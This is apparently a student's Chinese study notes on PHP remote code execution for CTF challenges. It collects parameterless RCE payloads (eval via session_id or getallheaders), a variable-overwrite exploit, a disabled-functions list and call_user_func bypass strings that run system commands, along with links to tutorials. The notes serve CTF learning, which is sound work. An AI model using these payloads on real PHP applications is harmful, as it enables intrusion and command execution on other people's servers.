RCE

[TOC]

![1695642819728](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1695642819728.png)

[RCE漏洞基础及CTF绕过_长度限制为7的rce绕过-CSDN博客](https://blog.csdn.net/qq_61988806/article/details/135002019?ops_request_misc=&request_id=&biz_id=102&utm_term=[NISACTF 2022]middlerce&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-135002019.142^v100^pc_search_result_base1&spm=1018.2226.3001.4187)

csdn上有，收藏

#### [HUBUCTF 2022 新生赛]HowToGetShell已解决

一道rce题

使用xor绕过，就是把命令转换为字符（通过异或）。有脚本。

##### 取反，请求头

就是绕过嘛，用取反

取反脚本在ctf_tools里面

![1699538174455](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1699538174455.png)

![1699538203948](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1699538203948.png)

### 无参RCE

 //无参REC的标志之一

preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {

[无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/133808536)

简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。

```
eval(hex2bin(session_id(session_start())));
 
print_r(current(get_defined_vars()));&b=phpinfo();
 
eval(next(getallheaders()));
 
var_dump(getenv(phpinfo()));
 
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
 
print_r(scandir(next(scandir(getcwd()))));//查看上一级目录的文件
```

![1699538241187](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1699538241187.png)

![1699538256131](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1699538256131.png)

相关网址：[[鹏城杯 2022\]简单的php - 无数字字母RCE+取反【*】 (element-ui.cn)](http://element-ui.cn/article/show-1964995.html?action=onClick)

#### 变量覆盖

[[MoeCTF 2022\]ezphp | NSSCTF](https://www.nssctf.cn/problem/3348)

```
?b=flag&flag=b
重点在
foreach ($_GET as $key => $value) {
$$key = $$value;
}
1.$b=$flag
2.$flag=$b
```

[CTF——PHP审计——变量覆盖_foreach($_get as $key => $value)-CSDN博客](https://blog.csdn.net/vhkjhwbs/article/details/100061332?ops_request_misc=&request_id=&biz_id=102&utm_term=变量覆盖 ctf&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-100061332.142^v96^pc_search_result_base1&spm=1018.2226.3001.4187)

###### disable_function:

```
"exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents","unserialize","serialize"
```

system(“find / -name flag”)：查找所有文件名匹配flag的文件



######  call_user_func($func, $p)

假如像system等函数被禁掉，

func=\system&p=ls

func=\system&p=find+/+-name+flag*//找到所有包含flag的文件

这样的也可以

###### RCE大全

https://xz.aliyun.com/t/8107?time__1311=n4%2BxuDgDBDyGD%3DDOFD%2FD0ioQL3ZW3sb4D&alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F8107#toc-3

